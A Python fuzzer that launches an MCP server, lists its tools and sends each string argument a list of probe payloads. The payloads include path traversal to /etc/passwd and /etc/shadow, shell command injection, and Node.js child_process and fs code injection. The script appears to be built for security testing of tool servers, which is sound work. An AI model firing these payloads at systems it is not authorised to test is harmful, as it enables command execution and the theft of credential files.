#!/usr/bin/env python3
"""
MCP Fuzzer
Wraps an MCP server process, handles initialization, and fuzzes available tools.
"""

import json
import subprocess
import sys
import threading
import time


def read_stream(stream, callback):
    while True:
        line = stream.readline()
        if not line:
            break
        callback(line)


class MCAFuzzer:
    def __init__(self, command):
        self.command = command
        self.process = None
        self.msg_id = 0
        self.responses = {}
        self.tools = []

    def start(self):
        print(f"Starting server with command: {self.command}")
        self.process = subprocess.Popen(
            self.command,
            shell=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=sys.stderr,
            text=True,
            bufsize=1,
        )
        # Start reader thread
        t = threading.Thread(
            target=read_stream, args=(self.process.stdout, self.handle_line)
        )
        t.daemon = True
        t.start()

    def handle_line(self, line):
        try:
            msg = json.loads(line)
            # print(f"RX: {line.strip()}")
            if "id" in msg and msg["id"] is not None:
                self.responses[msg["id"]] = msg
        except:
            pass

    def send_request(self, method, params=None):
        self.msg_id += 1
        req = {"jsonrpc": "2.0", "id": self.msg_id, "method": method}
        if params:
            req["params"] = params

        # print(f"TX: {json.dumps(req)}")
        if self.process and self.process.stdin:
            self.process.stdin.write(json.dumps(req) + "\n")
            self.process.stdin.flush()
        return self.msg_id

    def wait_for_response(self, msg_id, timeout=5):
        start = time.time()
        while time.time() - start < timeout:
            if msg_id in self.responses:
                return self.responses[msg_id]
            time.sleep(0.1)
        return None

    def fuzz(self):
        # Initialize
        print("Handshaking...")
        init_id = self.send_request(
            "initialize",
            {
                "protocolVersion": "2024-11-05",
                "capabilities": {},
                "clientInfo": {"name": "mcp-fuzzer", "version": "1.0"},
            },
        )
        resp = self.wait_for_response(init_id)
        if not resp:
            print("No initialize response")
            return

        self.send_request("notifications/initialized")

        # List tools
        print("Listing tools...")
        list_id = self.send_request("tools/list")
        resp = self.wait_for_response(list_id)
        if not resp or "result" not in resp or "tools" not in resp["result"]:
            print("No tools found")
            return

        self.tools = resp["result"]["tools"]
        print(f"Found {len(self.tools)} tools")

        # Fuzz Loop
        payloads = [
            "../../../etc/passwd",
            "/etc/shadow",
            "; id",
            "$(id)",
            "| id",
            "`id`",
            "test_file.txt",
            ".",
            "/",
            "nonexistent_file",
            "malicious_code_payload",
            # Node.js / JS Injection
            "require('child_process').execSync('id').toString()",
            "process.mainModule.require('child_process').execSync('id').toString()",
            "(function(){ return require('child_process').execSync('id').toString(); })()",
            "require('fs').readFileSync('/etc/passwd').toString()",
            # ESM / Async Payloads
            "(async function(){ (await import('child_process')).execSync('id') })()",
            "import('child_process').then(cp => cp.execSync('id'))",
        ]

        for tool in self.tools:
            name = tool["name"]
            print(f"Fuzzing tool: {name}")
            schema = tool.get("inputSchema", {})
            props = schema.get("properties", {})

            # Generate args
            # We construct a base argument set
            base_args = {}
            for prop_name, prop_def in props.items():
                if prop_def.get("type") == "string":
                    base_args[prop_name] = "test"
                else:
                    base_args[prop_name] = "test"  # Default fallback

            # For each string property, try payloads
            for prop_name, prop_def in props.items():
                if prop_def.get("type") == "string":
                    for pay in payloads:
                        args = base_args.copy()
                        args[prop_name] = pay

                        print(f"  Sending payload '{pay}' to '{prop_name}'")
                        call_id = self.send_request(
                            "tools/call", {"name": name, "arguments": args}
                        )
                        # We don't strictly need to wait for response, just ensure it's processed
                        # But waiting helps avoid flooding
                        self.wait_for_response(call_id, timeout=1)

    def stop(self):
        if self.process:
            self.process.terminate()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python fuzzer.py <command>")
        sys.exit(1)

    cmd = " ".join(sys.argv[1:])
    fuzzer = MCAFuzzer(cmd)
    try:
        fuzzer.start()
        time.sleep(1)
        fuzzer.fuzz()
    finally:
        fuzzer.stop()
